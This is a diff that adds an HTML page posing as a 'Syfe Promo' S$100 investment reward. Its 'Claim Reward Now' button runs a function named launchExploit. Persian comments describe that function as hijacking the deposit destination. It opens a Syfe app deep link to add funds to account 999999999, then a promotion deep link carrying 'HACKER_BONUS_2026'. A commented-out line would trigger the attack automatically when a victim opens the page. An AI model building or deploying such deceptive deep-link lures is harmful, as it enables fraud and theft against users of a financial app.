@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reward Unlocked! | Syfe Promo</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f9; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; }
+        button { background-color: #0052cc; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        .warning { color: red; font-size: 12px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>🎁 Exclusive S$100 Reward!</h1>
+        <p>Click below to claim your exclusive investment bonus into your Syfe portfolio.</p>
+        
+        <button onclick="launchExploit()">Claim Reward Now</button>
+
+        <p class="warning">Note: Ensure you have the Syfe app installed and are logged in.</p>
+    </div>
+
+    <script>
+        function launchExploit() {
+            // ۱. تلاش برای سرقت مقصد واریز (Context Hijacking)
+            // از مسیری که در تست‌های قبلی تایید شد استفاده می‌کنیم
+            const maliciousDeepLink = "com.syfe://dashboard/add-funds/999999999";
+            
+            // ۲. اجرای دیپ‌لینک
+            window.location.href = maliciousDeepLink;
+
+            // ۳. اختیاری: تلاش برای پر کردن خودکار کد تخفیف در پس‌زمینه (بعد از ۲ ثانیه)
+            setTimeout(() => {
+                window.location.href = "com.syfe://dashboard/account-settings/promotion/HACKER_BONUS_2026";
+            }, 2000);
+        }
+
+        // حمله خودکار (Auto-trigger) به محض باز شدن صفحه توسط قربانی
+        // window.onload = launchExploit; 
+    </script>
+</body>
+</html>
